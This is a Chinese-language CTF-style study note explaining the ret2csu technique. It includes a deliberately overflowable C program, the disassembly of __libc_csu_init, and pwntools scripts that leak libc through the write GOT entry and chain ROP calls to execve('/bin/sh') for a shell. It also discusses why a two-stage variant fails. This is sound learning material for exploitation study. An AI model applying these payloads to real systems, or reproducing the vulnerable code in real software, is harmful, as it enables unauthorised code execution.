# Ret2csu

---

主要是运用了一些比较巧妙的Gadgets，原理基本不变，针对64bit程序(64位程序通过寄存器传参，而32位程序通过栈传递参数)

[ret2csu学习](https://bbs.pediy.com/thread-257546.htm) -------------->堆栈图画的很好

http://www.int0x80.top/Ret2csu/

---

### 源码

```c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
        char buf[128];
        read(STDIN_FILENO, buf, 512);  #明显的栈溢出
}

int main(int argc, char** argv) {
        write(STDOUT_FILENO, "Hello, World\n", 13);
        vulnerable_function();
}
```



### 原理

在 64 位程序中，函数的前 6 个参数是通过寄存器传递的**（参数存放顺序：RDI, RSI, RDX, RCX, R8 和 R9）**，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的` __libc_csu_init `中的 gadgets。这个函数是用来对` libc` 进行初始化操作的，而一般的程序都会调用` libc` 函数，所以这个函数一定会存在。

该函数汇编代码如下：**主要是函数0x400600 和0x400616对寄存器的处理**

```assembly
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r15  ###--------------从这一行开始重点
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r13d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp           # 重点
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp
```



**调试之后发现，既没有system函数，也无/bin/sh字符串，有NX保护，所以考虑ret2libc或者其他**

分析`CSU`函数 ，得到的gadget如下所示：  

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-04-10_15-35-38.png)

整个过程分三个步骤：

- 在主函数中使用过`write`函数，所以我们首先需要泄露该函数的got表，从而算出Libc的基地址，然后跳到`main`函数
- 再从`main`函数开始执行，这时候通过调用函数向`.bss`段写入 "/bin/sh"字符串；因为有NX保护，原本的buf可写入但不可执行，所以需要写入`.bss`段，该段具有可写可执行权限；再返回到main函数
- 根据libc 调用执行bss段中的execve(“/bin/sh”)

---

以上过程 地址对应了三个payload 

==函数原型==

>write 函数原型是 write (1,address,len)   //1 表示标准输出流 ，address 是 write 函数要输出信息的地址 ，而 len 表示输出长度
>
>read(int fd, void *buf, size_t count);  // fd是函数open的返回值，成果则返回已写入的字节数，失败，则返回-1；buf，要写到文件的数据；count，是buf的长度

**进一步思考**，其实"/bin/sh" 再libc中就有 ，应该不用直接写入然后调用，其次 为什么不用system函数.....?  有待进一步🤔

------------------>Q&A中有详解

### Payload

```python
from pwn import *
#from LibcSearcher import LibcSearcher  # LibcSearcher 使国人开发的查找库的小程序
context.log_level = "debug"
context(arch='amd64',os = "linux")
io = process("./level5")
e = ELF("./level5")

write_plt_addr = e.plt["write"]
write_got_addr = e.got["write"]

read_got = e.got["read"]
main_addr = e.symbols["main"]
bss_addr = e.bss()

gadget1 = 0x400606
gadget2 = 0x4005F0

def csu(rbx,rbp,r12,r13,r14,r15,ret):
    payload = b'A'*136 + p64(gadget1) #padding + fake_ebp + ret
    payload +=p64(0)  # 填充rsp，给寄存器赋值是从rsp+8开始
    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
    #rbx should be 0
    #rbp shuold be 1
    #r12 should be the founction we want to call
    #rdi=edi=r13d
    #rsi=r14
    #rdx=r15
    payload +=p64(gadget2) #ret
    payload +=0x38*b'A' #padding
    payload +=p64(ret) #ret

    return payload


io.recvuntil("Hello, World\n")
payload1 = csu(0,1,write_got_addr,1,write_got_addr,8,main_addr) #leak write_addr
# 这里参数三 目标调用函数 write_got_addr不能换为 write_plt_addr因为 他在调用时使用的是call 指令(相当于push&&jump)，与Ret2libc64例子不同，Ret2libc使用gadget，是使的EIP指向要运行的地址(即write_plt_addr)，所以填入 write_plt_addr会自动解析跳转；与call指令不同;下面的参数原因相同
io.sendline(payload1)
log.success("========== send payload1 ===========")

write_addr = u64(io.recv(8))    #泄露write函数Got表地址，从而得到基地址
log.success("write_addr:{}".format(hex(write_addr)))

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 	# libc=LibcSearcher('write',write_addr)
libc_base = write_addr - libc.symbols["write"]  #libc.dumps("write")  这种写法需要加载LibcSearcher
execve_addr = libc_base + libc.symbols["execve"]
log.success("execve_addr:{}".format(hex(execve_addr)))

io.recvuntil("Hello, World\n")
payload2 = csu(0,1,read_got,0,bss_addr,0x100,main_addr)  # 在bss_base写入execve ，bss+8写入/bin/sh
io.sendline(payload2)
#io.sendline(flat([execve_addr,'/bin/sh\x00']))
io.sendline(p64(execve_addr)+ b'/bin/sh\x00')
log.success("============ send payload2 ==========")


io.recvuntil("Hello, World\n")
payload3 = csu(0,1,bss_addr,bss_addr+8,0,0,main_addr)  # getshell，使EIP 指向.bss段，将bss_base填入的execve当作函数，后面的8字节当作参数 执行
io.sendline(payload3)
log.success("========== send payload3 ==============")

io.interactive()
```





### Q&A

Q1：网上的blog都是三次payload，能不能两次来实现？既然第一次payload以及得到了lic基地址，就可以算出execve 和 libc中的'/bin/sh'字符串的地址；然后把第三次的payload发出去；这样就只需要两次？这个思路 我先实现了一下啊 (Payload见下面代码).

A1：应该是不行的，ret2csu劫持程序控制流利用的是call    qword ptr 【r12+rbx*8】，注意这个中括号是间接寻址，也就是先将r12地址的值取出来，再进行跳转。如果直接将r12设为system的真实地址的话，就会将system地址存的值给取出来，然后再跳转到这个值的地址上去，而system地址存放的应该是函数的第一条汇编指令，就是一个无效的地址，就会出错了。如果将system地址写入bss段，再把r12设置为该bss段的地址，那么就是从bss地址中取出system函数的地址，再跳转到system函数处。

----->同时需要区分 **我们得到的`read_got `和` write_got_addr`都是一个got表的一个地址，改地址中存储着相对应的函数`wirte`和`read`的libc的地址，而通过libc计算得到的直接就是libc的地址；前者相当于对该值的指针，后者是值**

**注：以上解答咨询了up主**

```python
from pwn import *

context.log_level = "debug"
context(arch='amd64',os = "linux")
io = process("./level5")
e = ELF("./level5")

write_plt_addr = e.plt["write"]
write_got_addr = e.got["write"]

read_got = e.got["read"]
main_addr = e.symbols["main"]
bss_addr = e.bss()

gadget1 = 0x400606
gadget2 = 0x4005F0

def csu(rbx,rbp,r12,r13,r14,r15,ret):
    payload = b'A'*136 + p64(gadget1) #padding + fake_ebp + ret
    payload +=p64(0)  # 填充rsp，给寄存器赋值是从rsp+8开始
    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
    #rbx should be 0
    #rbp shuold be 1
    #r12 should be the founction we want to call
    #rdi=edi=r13d
    #rsi=r14
    #rdx=r15
    payload +=p64(gadget2) #ret
    payload +=0x38*b'A' #padding
    payload +=p64(ret) #ret

    return payload


io.recvuntil("Hello, World\n")
payload1 = csu(0,1,write_got_addr,1,write_got_addr,8,main_addr) #leak write_addr
io.sendline(payload1)
log.success("========== send payload1 ===========")

write_addr = u64(io.recv(8))  #泄露write函数Got表地址，从而得到基地址
log.success("write_addr:{}".format(hex(write_addr)))

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base = write_addr - libc.symbols["write"]
execve_addr = libc_base + libc.symbols["execve"]
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))   #获取'/bin/sh'字符串地址；根据ret2libc可知libc中存在该字符串
log.success("execve_addr:{}".format(hex(execve_addr)))

io.recvuntil("Hello, World\n")
payload2 = csu(0,1,execve_addr,bin_sh_addr,0,0,main_addr)
io.sendline(payload2)
log.success("=========== send payload2=========")

io.interactive()

```

以上Payload失败了..............



**wiki上的ret2libc的思路是32位的，使用堆栈传产，该程序为64位，使用寄存器传参，注意区别**



Q2：**新思路，通过csu第一次得到libc以后，后序其实可以不必使用csu，可以查找gadget，如果有合适的gadget就可以借鉴ret2libc来进行操作，不是使用csu(牛刀杀鸡)**

A2:如果避免上述csu实现所说的问题，使用野生的gadget，应该可以实现。

